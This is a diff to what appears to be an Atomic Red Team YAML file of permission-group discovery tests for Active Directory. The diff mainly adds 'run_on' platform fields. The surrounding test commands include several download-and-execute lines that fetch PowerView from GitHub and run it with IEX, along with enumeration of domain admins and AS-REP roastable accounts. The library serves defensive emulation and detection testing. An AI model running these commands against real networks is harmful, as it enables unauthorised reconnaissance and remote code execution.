@@ -15,6 +15,8 @@ atomic_tests:
       net group "enterprise admins" /domain
       net group "domain admins" /domain
     name: command_prompt
+  run_on:
+  - windows
 - name: Permission Groups Discovery PowerShell (Domain)
   auto_generated_guid: 6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7
   description: |
@@ -31,6 +33,8 @@ atomic_tests:
     command: |
       get-ADPrincipalGroupMembership #{user} | select name
     name: powershell
+  run_on:
+  - windows
 - name: Elevated group enumeration using net group (Domain)
   auto_generated_guid: 0afb5163-8181-432e-9405-4322710c0c37
   description: |
@@ -45,6 +49,8 @@ atomic_tests:
       net group "BUILTIN\Backup Operators" /doma
       net group /domai "Domain Admins"
     name: command_prompt
+  run_on:
+  - windows
 - name: Find machines where user has local admin access (PowerView)
   auto_generated_guid: a2d71eee-a353-4232-9f86-54f4288dd8c1
   description: |
@@ -56,6 +62,8 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
     name: powershell
+  run_on:
+  - windows
 - name: Find local admins on all machines in domain (PowerView)
   auto_generated_guid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
   description: |
@@ -67,6 +75,8 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
     name: powershell
+  run_on:
+  - windows
 - name: Find Local Admins via Group Policy (PowerView)
   auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
   description: |
@@ -83,6 +93,8 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose
     name: powershell
+  run_on:
+  - windows
 - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
   auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
   description: |
@@ -108,6 +120,8 @@ atomic_tests:
     elevation_required: false
     command: |
       get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
+  run_on:
+  - windows
 - name: Adfind - Query Active Directory Groups
   auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274
   description: |
@@ -117,7 +131,9 @@ atomic_tests:
   - windows
   input_arguments:
     optional_args:
-      description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use "-arg" notation to add arguments separated by spaces.
+      description: Allows defining arguments to add to the adfind command to tailor
+        it to the specific needs of the environment. Use "-arg" notation to add arguments
+        separated by spaces.
       type: string
       default:
   dependency_executor_name: powershell
@@ -134,6 +150,8 @@ atomic_tests:
     command: |
       "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=group) #{optional_args}
     name: command_prompt
+  run_on:
+  - windows
 - name: Enumerate Active Directory Groups with Get-AdGroup
   auto_generated_guid: 3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8
   description: |
@@ -146,6 +164,8 @@ atomic_tests:
     name: powershell
     command: |
       Get-AdGroup -Filter *
+  run_on:
+  - windows
 - name: Enumerate Active Directory Groups with ADSISearcher
   auto_generated_guid: 9f4e344b-8434-41b3-85b1-d38f29d148d0
   description: |
@@ -159,6 +179,8 @@ atomic_tests:
     elevation_required: false
     command: |
       ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+  run_on:
+  - windows
 - name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)
   auto_generated_guid: 43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8
   description: |
@@ -185,6 +207,8 @@ atomic_tests:
     elevation_required: false
     command: |
       Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+  run_on:
+  - windows
 - name: Get-DomainGroupMember with PowerView
   auto_generated_guid: 46352f40-f283-4fe5-b56d-d9a71750e145
   description: |
@@ -196,6 +220,8 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
     name: powershell
+  run_on:
+  - windows
 - name: Get-DomainGroup with PowerView
   auto_generated_guid: 5a8a181c-2c8e-478d-a943-549305a01230
   description: |
@@ -207,6 +233,8 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
     name: powershell
+  run_on:
+  - windows
 - name: Active Directory Enumeration with LDIFDE
   auto_generated_guid: 22cf8cb9-adb1-4e8c-80ca-7c723dfc8784
   description: |
@@ -248,7 +276,9 @@ atomic_tests:
     cleanup_command: |
       del #{output_path}\#{output_file}
     name: command_prompt
-- name: Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS
+  run_on:
+  - windows
+- name: Active Directory Domain Search Using LDAP - FreeBSD/Linux (Ubuntu)/macOS
   auto_generated_guid: d58d749c-4450-4975-a9e9-8b1d562755c2
   description: |
     Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory
@@ -260,7 +290,8 @@ atomic_tests:
       type: string
       default: example
     top_level_domain:
-      description: The top level domain (.com, .test, .remote, etc... following domain, minus the .)
+      description: The top level domain (.com, .test, .remote, etc... following domain,
+        minus the .)
       type: string
       default: com
     user:
@@ -284,3 +315,6 @@ atomic_tests:
     command: |
       ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" "(objectClass=group)" -s sub -a always -z 1000 dn 
     name: sh
+  run_on:
+  - freebsd
+  - linux
